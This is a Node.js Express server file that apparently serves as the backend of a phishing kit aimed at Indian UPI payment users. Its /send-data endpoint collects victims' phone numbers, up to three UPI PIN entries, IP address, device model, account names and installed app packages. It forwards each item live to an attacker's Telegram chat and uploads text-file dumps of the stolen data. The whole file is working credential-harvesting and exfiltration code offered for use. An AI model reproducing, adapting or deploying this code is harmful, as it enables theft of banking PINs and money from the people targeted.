require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

let lastMessageId = null;
let currentMessageText = "";
let pinCount = 0; 
let fullDeviceName = "Device_Details";

const sendOrUpdateTelegram = async (message) => {
    try {
        if (!lastMessageId) {
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            lastMessageId = response.data.result.message_id;
            currentMessageText = message;
        } else {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: CHAT_ID,
                message_id: lastMessageId,
                text: message,
                parse_mode: 'Markdown'
            });
            currentMessageText = message;
        }
    } catch (error) {
        // Fallback: Agar edit fail ho toh naya message bhej do
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        lastMessageId = response.data.result.message_id;
        currentMessageText = message;
    }
};

const sendFileToTelegram = async (content, filename) => {
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        const cleanContent = content.replace(/\*/g, ''); 
        const safeFilename = filename.replace(/[/\\?%*:|"<>]/g, '-'); 

        form.append('document', Buffer.from(cleanContent, 'utf-8'), { 
            filename: `${safeFilename}.txt` 
        });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (error) {}
};

const startupNotification = async () => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `*BJP Client's*`,
            parse_mode: 'Markdown'
        });
    } catch (e) {}
};

app.post('/send-data', async (req, res) => {
    const { type, number, pin, deviceId, deviceTime, deviceDate, userIP, accounts, packages } = req.body;
    
    if (deviceId) {
        fullDeviceName = deviceId;
    }

    // STEP 1: NUMBER
    if (type === 'NUMBER') {
        lastMessageId = null; 
        pinCount = 0; 

        let updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
        updatedText += `*IP Address:* "${userIP || 'Detecting...'}"\n`; 
        updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
        updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
        updatedText += `*Number:* "+91${number}"\n`;
        
        currentMessageText = updatedText;
        await sendOrUpdateTelegram(currentMessageText);
    } 
    
    // STEP 2: PIN
    else if (pin) {
        pinCount++; 
        currentMessageText += `*UPI PIN:* "${pin}"\n`;
        await sendOrUpdateTelegram(currentMessageText);
        if (pinCount === 3) {
            await sendFileToTelegram(currentMessageText, fullDeviceName);
        }
    }

    // STEP 3: ACCOUNTS & PACKAGES (IMPORTANT UPDATE)
    else if (accounts || packages) {
        let extraInfo = `\n*--- Account's ---*\n`;
        
        // Safety Parse for Accounts
        let accList = accounts;
        try {
            if (typeof accounts === 'string') accList = JSON.parse(accounts);
        } catch (e) { accList = accounts; }

        if (accList && Array.isArray(accList) && accList.length > 0) {
            accList.forEach(acc => { extraInfo += `• ${acc}\n`; });
        } else {
            extraInfo += `No Accounts Found\n`;
        }

        extraInfo += `\n*--- Package's ---*\n`;
        
        // Safety Parse for Packages
        let pkgList = packages;
        try {
            if (typeof packages === 'string') pkgList = JSON.parse(packages);
        } catch (e) { pkgList = packages; }

        if (pkgList && Array.isArray(pkgList) && pkgList.length > 0) {
            pkgList.forEach(pkg => { extraInfo += `• ${pkg}\n`; });
        } else {
            extraInfo += `No Packages Found\n`;
        }

        // Final Append and Update
        currentMessageText += extraInfo;
        await sendOrUpdateTelegram(currentMessageText);
        
        // Step 3 aate hi final backup file bhej dega
        await sendFileToTelegram(currentMessageText, `Full_Data_${fullDeviceName}`);
    }
    
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    startupNotification();
});
